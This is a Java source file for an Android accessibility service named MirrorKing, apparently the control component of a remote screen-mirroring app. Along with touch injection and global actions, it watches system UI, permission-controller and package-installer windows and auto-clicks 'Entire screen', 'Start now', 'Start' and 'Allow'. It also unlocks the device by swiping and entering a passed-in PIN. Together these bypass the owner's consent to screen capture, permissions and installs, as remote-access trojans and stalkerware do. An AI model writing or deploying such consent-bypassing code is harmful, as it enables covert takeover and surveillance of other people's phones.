package com.secuready.mirrorking;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class MirrorKingAccessibilityService extends AccessibilityService {
    private static final String TAG = "MirrorKingA11y";
    public static volatile MirrorKingAccessibilityService instance;

    private float lastX = 0;
    private float lastY = 0;
    private boolean isTouching = false;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.i(TAG, "MirrorKing Accessibility Service Connected and Active");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (instance == this) {
            instance = null;
        }
        Log.i(TAG, "MirrorKing Accessibility Service Destroyed");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        CharSequence pkg = event.getPackageName();
        if (pkg != null) {
            String pkgStr = pkg.toString().toLowerCase();
            if (pkgStr.contains("systemui") || pkgStr.contains("permissioncontroller") || pkgStr.contains("packageinstaller")) {
                handleSystemDialog();
            }
        }
    }

    private void handleSystemDialog() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            List<AccessibilityNodeInfo> fullScreenNodes = root.findAccessibilityNodeInfosByText("Entire screen");
            if (fullScreenNodes != null) {
                for (AccessibilityNodeInfo node : fullScreenNodes) {
                    clickNode(node);
                }
            }

            List<AccessibilityNodeInfo> startNowNodes = root.findAccessibilityNodeInfosByText("Start now");
            if (startNowNodes != null && !startNowNodes.isEmpty()) {
                for (AccessibilityNodeInfo node : startNowNodes) {
                    clickNode(node);
                }
                return;
            }

            List<AccessibilityNodeInfo> startNodes = root.findAccessibilityNodeInfosByText("Start");
            if (startNodes != null && !startNodes.isEmpty()) {
                for (AccessibilityNodeInfo node : startNodes) {
                    clickNode(node);
                }
                return;
            }

            List<AccessibilityNodeInfo> allowNodes = root.findAccessibilityNodeInfosByText("Allow");
            if (allowNodes != null && !allowNodes.isEmpty()) {
                for (AccessibilityNodeInfo node : allowNodes) {
                    clickNode(node);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling system dialog: " + e.getMessage());
        }
    }

    private void clickNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.isClickable()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        } else {
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null) {
                if (parent.isClickable()) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
                parent.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "MirrorKing Accessibility Service Interrupted");
    }

    public void injectTouch(int action, float x, float y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Path path = new Path();
        long duration = 40;

        if (action == Config.TOUCH_DOWN) {
            path.moveTo(x, y);
            path.lineTo(x, y);
            lastX = x;
            lastY = y;
            isTouching = true;
            duration = 30;
        } else if (action == Config.TOUCH_MOVE) {
            if (!isTouching) {
                path.moveTo(x, y);
                lastX = x;
                lastY = y;
                isTouching = true;
            } else {
                path.moveTo(lastX, lastY);
                path.lineTo(x, y);
                lastX = x;
                lastY = y;
            }
            duration = 30;
        } else if (action == Config.TOUCH_UP) {
            path.moveTo(lastX, lastY);
            path.lineTo(x, y);
            isTouching = false;
            duration = 20;
        }

        try {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
            dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.e(TAG, "Failed to dispatch gesture: " + e.getMessage());
        }
    }

    public void performGlobal(int action) {
        switch (action) {
            case Config.ACT_BACK:
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            case Config.ACT_HOME:
                performGlobalAction(GLOBAL_ACTION_HOME);
                break;
            case Config.ACT_RECENTS:
                performGlobalAction(GLOBAL_ACTION_RECENTS);
                break;
            case Config.ACT_POWER:
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                }
                break;
            case Config.ACT_NOTIF:
                performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
                break;
            case Config.ACT_QUICK_SET:
                performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
                break;
        }
    }

    public void unlockDevice(String pin) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        DisplayMetrics dm = getResources().getDisplayMetrics();
        float midX = dm.widthPixels / 2.0f;
        float startY = dm.heightPixels * 0.85f;
        float endY = dm.heightPixels * 0.25f;

        Path swipePath = new Path();
        swipePath.moveTo(midX, startY);
        swipePath.lineTo(midX, endY);

        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 300));
        dispatchGesture(builder.build(), new PinUnlockCallback(this, pin), null);
    }

    private static class PinUnlockCallback extends AccessibilityService.GestureResultCallback {
        private final MirrorKingAccessibilityService service;
        private final String pin;

        public PinUnlockCallback(MirrorKingAccessibilityService service, String pin) {
            this.service = service;
            this.pin = pin;
        }

        @Override
        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
            if (pin != null && !pin.isEmpty() && service != null) {
                service.mainHandler.postDelayed(new PinRunner(service, pin), 400);
            }
        }
    }

    private static class PinRunner implements Runnable {
        private final MirrorKingAccessibilityService service;
        private final String pin;

        public PinRunner(MirrorKingAccessibilityService service, String pin) {
            this.service = service;
            this.pin = pin;
        }

        @Override
        public void run() {
            if (service != null) {
                service.enterPinOrText(pin);
            }
        }
    }

    public void enterPinOrText(String text) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focused != null) {
            android.os.Bundle args = new android.os.Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            focused.recycle();
        }
        root.recycle();
    }
}
